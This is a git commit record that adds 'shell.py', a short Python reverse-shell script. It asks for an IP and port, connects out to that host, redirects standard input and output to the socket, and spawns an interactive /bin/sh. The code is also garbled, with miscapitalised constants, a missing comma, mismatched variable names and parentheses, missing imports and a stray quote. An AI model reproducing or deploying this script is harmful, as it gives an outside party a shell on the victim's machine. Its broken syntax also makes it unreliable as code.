9a2c59c6845afebfacebc1436a623ad27c8f2ab0
heyono <57118867+heyono@users.noreply.github.com>
2019-10-28 19:02:10 -0600

    Create shell.py

---
+++ shell.py
@@ -0,0 +1,9 @@
+#!/usr/bin/python3
+
+import socket
+L=socket.socket(SOCKET.AF_INET SOCKET.SOCK_STREAM)
+s.connect((input("enter the ip adress",input("enter the port you want to use"));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
